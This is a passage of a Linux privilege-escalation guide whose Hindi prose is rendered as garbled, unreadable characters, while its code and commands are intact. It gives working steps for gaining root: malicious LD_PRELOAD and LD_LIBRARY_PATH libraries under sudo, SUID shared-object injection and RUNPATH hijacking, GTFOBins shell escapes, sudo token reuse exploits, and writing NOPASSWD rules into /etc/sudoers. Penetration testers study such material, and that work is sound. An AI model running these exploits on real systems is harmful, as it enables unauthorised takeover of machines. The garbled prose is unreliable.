* рд▓реЛрдбрд░ рдЙрди рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХреЗ рд▓рд┐рдП **LD\_PRELOAD** рдХреА рдЕрдирджреЗрдЦреА рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА (_ruid_) рдкреНрд░рднрд╛рд╡реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА (_euid_) рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддреАред
* suid/sgid рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХреЗ рд▓рд┐рдП, рдХреЗрд╡рд▓ рдорд╛рдирдХ рдкрдереЛрдВ рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рдкреНрд░реАрд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рднреА suid/sgid рд╣реИрдВред

рдЕрдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рддрдм рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ `sudo` рдХреЗ рд╕рд╛рде рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рдФрд░ `sudo -l` рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ **env\_keep+=LD\_PRELOAD** рдХрдерди рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реЛред рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди **LD\_PRELOAD** рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдФрд░ рдЗрд╕реЗ рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рднрд▓реЗ рд╣реА рдХрдорд╛рдВрдб `sudo` рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдП рдЬрд╛рдПрдВ, рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```
Defaults        env_keep += LD_PRELOAD
```
Save as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
рдлрд┐рд░ **рдЗрд╕реЗ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
рдЕрдВрдд рдореЗрдВ, **privileges рдмрдврд╝рд╛рдПрдБ** рдЪрд▓рд╛рддреЗ рд╣реБрдП
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ **LD\_LIBRARY\_PATH** env рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╕рдорд╛рди рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╡рд╣ рдЙрд╕ рдкрде рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЦреЛрдЬ рдХреА рдЬрд╛рдПрдЧреАред
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID рдмрд╛рдЗрдирд░реА тАУ .so рдЗрдВрдЬреЗрдХреНрд╢рди

рдЬрдм рдХрд┐рд╕реА рдмрд╛рдЗрдирд░реА рдХрд╛ рд╕рд╛рдордирд╛ **SUID** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЕрд╕рд╛рдорд╛рдиреНрдп рд▓рдЧрддреА рд╣реИ, рддреЛ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рдЕрднреНрдпрд╛рд╕ рд╣реИ рдХрд┐ рдпрд╣ **.so** рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд▓реЛрдб рдХрд░ рд░рд╣реА рд╣реИред рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рдХрд░ рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, _"open(тАЬ/path/to/.config/libcalc.soтАЭ, O\_RDONLY) = -1 ENOENT (рдХреЛрдИ рдРрд╕рд╛ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдирд╣реАрдВ)"_ рдЬреИрд╕реА рддреНрд░реБрдЯрд┐ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рд╢реЛрд╖рдг рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХрд╛ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЛрдИ рдПрдХ C рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдЧрд╛, рдЬреИрд╕реЗ _"/path/to/.config/libcalc.c"_, рдЬрд┐рд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рд╣реЛрдЧрд╛:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
рдпрд╣ рдХреЛрдб, рдПрдХ рдмрд╛рд░ рд╕рдВрдХрд▓рд┐рдд рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдкрд░, рдлрд╝рд╛рдЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХрд░рдХреЗ рдФрд░ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╢реЗрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рд▓рдХреНрд╖реНрдп рд░рдЦрддрд╛ рд╣реИред

рдЙрдкрд░реЛрдХреНрдд C рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рд╛рдЭрд╛ рд╡рд╕реНрддреБ (.so) рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
рдЕрдВрдд рдореЗрдВ, рдкреНрд░рднрд╛рд╡рд┐рдд SUID рдмрд╛рдЗрдирд░реА рдХреЛ рдЪрд▓рд╛рдирд╛ рд╣рдорд▓реЗ рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд╕рд┐рд╕реНрдЯрдо рд╕рдордЭреМрддрд╛ рд╣реЛ рд╕рдХреЗред

## рд╕рд╛рдЭрд╛ рд╡рд╕реНрддреБ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
рдЕрдм рдЬрдм рд╣рдордиреЗ рдПрдХ SUID рдмрд╛рдЗрдирд░реА рдЦреЛрдЬ рд▓реА рд╣реИ рдЬреЛ рдПрдХ рдРрд╕реЗ рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд▓реЛрдб рдХрд░ рд░рд╣реА рд╣реИ рдЬрд╣рд╛рдБ рд╣рдо рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдЗрдП рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдирд╛рдо рдХреЗ рд╕рд╛рде рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдмрдирд╛рддреЗ рд╣реИрдВ:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
рдпрджрд┐ рдЖрдкрдХреЛ рдЗрд╕ рддрд░рд╣ рдХреА рддреНрд░реБрдЯрд┐ рдорд┐рд▓рддреА рд╣реИ
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
рдпрд╣ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдкрдиреЗ рдЬреЛ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рд╣реИ, рдЙрд╕рдореЗрдВ `a_function_name` рдирд╛рдордХ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) рдПрдХ рдХреНрдпреВрд░реЗрдЯреЗрдб рд╕реВрдЪреА рд╣реИ Unix рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреА, рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред [**GTFOArgs**](https://gtfoargs.github.io/) рд╡рд╣реА рд╣реИ рд▓реЗрдХрд┐рди рдЙрди рдорд╛рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЬрд╣рд╛рдВ рдЖрдк **рдХреЗрд╡рд▓ рддрд░реНрдХреЛрдВ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдПрдХ рдХрдорд╛рдВрдб рдореЗрдВред

рдпрд╣ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдЙрди Unix рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЗ рд╡реИрдз рдлрд╝рдВрдХреНрд╢рдВрд╕ рдХреЛ рдЗрдХрдЯреНрдард╛ рдХрд░рддреА рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╢реЗрд▓ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ, рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдпрд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ, рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ, рдмрд╛рдЗрдВрдб рдФрд░ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХреЛ рд╕реНрдкреЙрди рдХрд░рдиреЗ, рдФрд░ рдЕрдиреНрдп рдкреЛрд╕реНрдЯ-рд╢реЛрд╖рдг рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

рдпрджрд┐ рдЖрдк `sudo -l` рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрдкрдХрд░рдг [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдХрд┐рд╕реА рднреА sudo рдирд┐рдпрдо рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдЦреЛрдЬрддрд╛ рд╣реИред

### Sudo рдЯреЛрдХрди рдХрд╛ рдкреБрди: рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдкрдХреЗ рдкрд╛рд╕ **sudo рдкрд╣реБрдБрдЪ** рд╣реИ рд▓реЗрдХрд┐рди рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рд╣реИ, рдЖрдк **sudo рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдХреЗ рдФрд░ рдлрд┐рд░ рд╕рддреНрд░ рдЯреЛрдХрди рдХреЛ рд╣рд╛рдИрдЬреИрдХ рдХрд░рдХреЗ** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ:

* рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА "_sampleuser_" рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╢реЗрд▓ рд╣реИ
* "_sampleuser_" рдиреЗ **рдЕрдВрддрд┐рдо 15 рдорд┐рдирдЯ рдореЗрдВ рдХреБрдЫ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ** (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ рд╡рд╣ рдЕрд╡рдзрд┐ рд╣реИ рдЬреЛ sudo рдЯреЛрдХрди рдХреА рд╣реЛрддреА рд╣реИ рдЬреЛ рд╣рдореЗрдВ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ `sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ)
* `cat /proc/sys/kernel/yama/ptrace_scope` 0 рд╣реИ
* `gdb` рд╕реБрд▓рдн рд╣реИ (рдЖрдк рдЗрд╕реЗ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ)

(рдЖрдк рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ `ptrace_scope` рдХреЛ `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` рдХреЗ рд╕рд╛рде рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ `/etc/sysctl.d/10-ptrace.conf` рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдФрд░ `kernel.yama.ptrace_scope = 0` рд╕реЗрдЯ рдХрд░рдХреЗ)

рдпрджрд┐ рдпреЗ рд╕рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рдкреВрд░реА рд╣реЛрддреА рд╣реИрдВ, рддреЛ **рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)

* **рдкрд╣рд▓рд╛ рд╢реЛрд╖рдг** (`exploit.sh`) _/tmp_ рдореЗрдВ рдмрд╛рдЗрдирд░реА `activate_sudo_token` рдмрдирд╛рдПрдЧрд╛ред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЕрдкрдиреЗ рд╕рддреНрд░ рдореЗрдВ sudo рдЯреЛрдХрди рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдкрдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ рд░реВрдЯ рд╢реЗрд▓ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛, `sudo su` рдХрд░реЗрдВ):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* The **рджреВрд╕рд░рд╛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ** (`exploit_v2.sh`) _/tmp_ рдореЗрдВ **рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯрдпреВрдЖрдИрдбреА рдХреЗ рд╕рд╛рде рдПрдХ рд╢ рд╢реЗрд▓ рдмрдирд╛рдПрдЧрд╛**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* The **third exploit** (`exploit_v3.sh`) **рдПрдХ sudoers рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдЧрд╛** рдЬреЛ **sudo рдЯреЛрдХрди рдХреЛ рд╢рд╛рд╢реНрд╡рдд рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ sudo рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рдмрдирд╛рдП рдЧрдП рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ, рддреЛ рдЖрдк рдмрд╛рдЗрдирд░реА [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ PID рдХреЗ рд▓рд┐рдП sudo рдЯреЛрдХрди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдлрд╝рд╛рдЗрд▓ _/var/run/sudo/ts/sampleuser_ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ PID 1234 рдХреЗ рд╕рд╛рде рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╢реЗрд▓ рд╣реИ, рддреЛ рдЖрдк **sudo рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдмрд┐рдирд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдиреЗ:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

рдлрд╛рдЗрд▓ `/etc/sudoers` рдФрд░ рдлрд╛рдЗрд▓реЗрдВ `/etc/sudoers.d` рдХреЗ рдЕрдВрджрд░ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИрдВ рдХрд┐ рдХреМрди `sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХреИрд╕реЗред рдпреЗ рдлрд╛рдЗрд▓реЗрдВ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд░реВрдЯ рдФрд░ рд╕рдореВрд╣ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдкрдврд╝реА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
**рдпрджрд┐** рдЖрдк рдЗрд╕ рдлрд╛рдЗрд▓ рдХреЛ **рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк **рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рдпрджрд┐ рдЖрдк рдХреЛрдИ рдлрд╛рдЗрд▓ **рд▓рд┐рдЦ** рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк **рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛** рд╕рдХреЗрдВрдЧреЗред
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
рдпрджрд┐ рдЖрдк рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` рдмрд╛рдЗрдирд░реА рдХреЗ рдХреБрдЫ рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ OpenBSD рдХреЗ рд▓рд┐рдП `doas`, рдЗрд╕рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди `/etc/doas.conf` рдкрд░ рдЬрд╛рдВрдЪрдирд╛ рди рднреВрд▓реЗрдВред
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

рдпрджрд┐ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдорддреМрд░ рдкрд░ рдПрдХ рдорд╢реАрди рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП `sudo` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдПрдХ рд╢реЗрд▓ рд╣реИ, рддреЛ рдЖрдк **рдПрдХ рдирдпрд╛ sudo рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдЖрдкрдХреЗ рдХреЛрдб рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдФрд░ рдлрд┐рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред рдлрд┐рд░, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рдХрд╛ $PATH рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП .bash\_profile рдореЗрдВ рдирдпрд╛ рдкрде рдЬреЛрдбрд╝рдирд╛) рддрд╛рдХрд┐ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ sudo рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗ, рддреЛ рдЖрдкрдХрд╛ sudo рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдЕрд▓рдЧ рд╢реЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (bash рдирд╣реАрдВ) рддреЛ рдЖрдкрдХреЛ рдирдП рдкрде рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЖрдк [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) рдореЗрдВ рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

